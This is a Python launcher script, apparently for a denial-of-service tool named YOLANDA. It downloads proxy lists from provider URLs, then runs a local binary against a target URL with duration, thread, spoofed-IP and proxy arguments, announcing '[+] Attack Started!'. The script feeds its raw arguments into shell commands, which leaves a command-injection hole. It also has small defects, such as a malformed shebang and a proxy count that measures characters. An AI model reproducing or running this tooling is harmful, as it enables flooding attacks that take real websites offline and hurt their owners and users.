
#!usr/bin/env python3


from sys import argv
from subprocess import run
requests = __import__("httpx")


class YOLANDA:
	def __init__(self, target, time, thread, spoofIP, proxyfile):
		super().__init__()

		self._target = target
		self._time = time
		self._thread = thread
		self._spoofIP = spoofIP
		self._fproxy = proxyfile

	def getproxy(self) -> None:
		print("[+] Checking Proxy Providers...")
		with open("proxy_providers.txt", mode="r") as readurl:
			print("[+] Downloading Proxies...")
			for url in readurl:
				url = url.strip()
				with open(self._fproxy, mode="a") as file:
					try:
						file.write(requests.get(url, timeout=1000).text)
					except requests.ConnectError:
						exit("[-] Connection Error")
					except KeyboardInterrupt:
						exit()
		with open("proxy_providers.txt", mode="r") as proxy:
			print(f"[+] Total Proxies: {len(proxy.read())}")
		readurl.close()
		file.close()
		proxy.close()

	def start(self) -> None:
		print("[+] Attack Started!")
		run(["chmod 777 YOLANDA"], shell=True)
		run([f"./YOLANDA {self._target} {self._time} {self._thread} {self._spoofIP} {self._fproxy}"], shell=True)


if __name__ == "__main__":
	try:
		if int(argv[3]) > 3 or int(argv[3]) < 1:
			exit("[-] MaxThread: 3")
		else:
			yolanda = YOLANDA(target=str(argv[1]), time=int(argv[2]), thread=int(argv[3]), spoofIP=str(argv[4]), proxyfile=str(argv[5]))
			yolanda.getproxy()
			yolanda.start()
	except Exception:
		print("\033cUsage:\n python3 start.py [TagetURL] [Time] [Thread] [spoofIP] [Proxyfile]")
		exit("Example:\n python3 start.py https://website.com 1200 1 spoofIP.txt proxy.txt")
